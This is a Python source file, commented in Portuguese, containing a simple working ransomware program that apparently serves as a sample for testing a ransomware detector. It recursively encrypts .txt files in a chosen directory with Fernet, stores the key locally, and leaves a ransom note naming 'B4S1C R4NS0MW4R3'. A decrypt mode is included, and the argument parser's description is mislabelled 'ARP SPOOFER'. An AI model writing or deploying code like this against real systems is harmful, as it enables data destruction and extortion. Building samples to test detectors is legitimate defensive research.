import os
import argparse
import pathlib
from time import sleep
from cryptography.fernet import Fernet

# Caminho teste para criptografar/descriptografar
# python basicaransomware.py -p "/home/matheusheidemann/Documents/Python Files/Python-Ransomware-Detector/ransomware-samples/encrypt-test".


# CLASSES
# Classe da chave de criptografia
class CryptoKey:
    # Gerar uma chave de criptografia
    def generateKey():
        key_value = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key_value)

    # Carregar a chave de criptografia gerada
    def loadKey():
        return open('key.key', 'rb').read()


# Classe das funcionalidades do Ransomware
class Ransomware:
    # Criar o arquivo de instruções
    def createTxt(directory):
        with open(directory + '/' + 'How to decrypt your files.txt', 'w') as file:
            file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by BASH BUNNY\n")
            file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")

    # Deletar o arquivo de instruções

    def deleteTxt(directory):
        if os.path.exists(directory + '/' + 'How to decrypt your files.txt'):
            os.remove(directory + '/' + 'How to decrypt your files.txt')

    # Criptografar/Descriptografar os arquivos
    def run(directory, key, action):
        # Deletar o txt caso esteja descriptografando
        if action == "decrypt":
            Ransomware.deleteTxt(directory)

        # Criar uma lista com as extensões de arquivos
        #file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
        file_extensions = [".txt"]
        crypto_count = 0
        # Pegar os arquivos recursivamente para criptografar/descriptografar
        for current_path, _, files_in_current_path in os.walk(directory):
            for file in files_in_current_path:
                if pathlib.Path(file).suffix in file_extensions:
                    file_abs_full_path = os.path.join(current_path, file)

                    with open(file_abs_full_path, 'rb') as file_bytes:
                        file_data = file_bytes.read()
                        if action == "encrypt":
                            final_data = Fernet(key).encrypt(file_data)
                        elif action == "decrypt":
                            final_data = Fernet(key).decrypt(file_data)

                    with open(file_abs_full_path, 'wb') as file_bytes:
                        file_bytes.write(final_data)
                        # print(str(os.getpid()))
                        # sleep(0.00000001)
                        # O programa só pega se o ransomware demorar no min 0.07s
                crypto_count += 1
                print(crypto_count)

     # Criar o txt caso esteja criptografando
        if action == "encrypt":
            Ransomware.createTxt(directory)

        # Printar que teve sucesso ao criptografar/descriptografar os arquivos
        print(f"Todos os arquivos do diretório '{directory}' e filhos foram {'criptografados' if action == 'encrypt' else 'descriptografados'} com sucesso!\n")


# FUNÇÕES
# Função para pegar os argumentos
def getArguments():
    parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
    parser.add_argument("-p", "--path", action="store", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-e", "--encrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-d", "--decrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    args = parser.parse_args()

    # Checar se o usuário passou --encrypt e --decrypt ao mesmo tempo
    if args.encrypt and args.decrypt:
        print("ERRO - Você passou o argumento --encrypt e --decrypt! Por favor, use apenas um dos dois!")
        print("Finzalizando...")
        quit()

    # Checar se o usuário não passou --encrypt ou --decrypt
    if not args.encrypt and not args.decrypt:
        print("ERRO - Você não passou o argumento --encrypt ou --decrypt! Por favor, define qual a operação que será realizada!")
        print("Finzalizando...")
        quit()

    # Checar se o usuário passou o caminho para criptografar/descriptografar
    if args.path:
        if not os.path.exists(args.path):
            print("ERRO! O caminho fornecido não existe!")
            print("Finzalizando...")
            quit()
    else:
        print(f"ERRO! Você precisa fornecer um caminho para {'criptografar' if args.encrypt else 'descriptografar'}!")
        print("Finzalizando...")
        quit()

    # Retornar os argumentos
    return args


# MAIN
if __name__ == '__main__':
    # Pegar os argumentos
    args = getArguments()

    # O diretório que terá os arquivos criptografados/descriptografados
    directory = args.path

    # Criptografar ou Descriptografar os arquivos
    # Criptografar
    if args.encrypt:
        # Gerar a chave de criptografia
        key = CryptoKey.generateKey()
        # Carregar a chave de criptografia
        key = CryptoKey.loadKey()
        # Criptografar os arquivos
        Ransomware.run(directory, key, "encrypt")

    # Descriptografar
    elif args.decrypt:
        # Carregar a chave de criptografia
        key = CryptoKey.loadKey()
        # Descriptografar os arquivos
        Ransomware.run(directory, key, "decrypt")
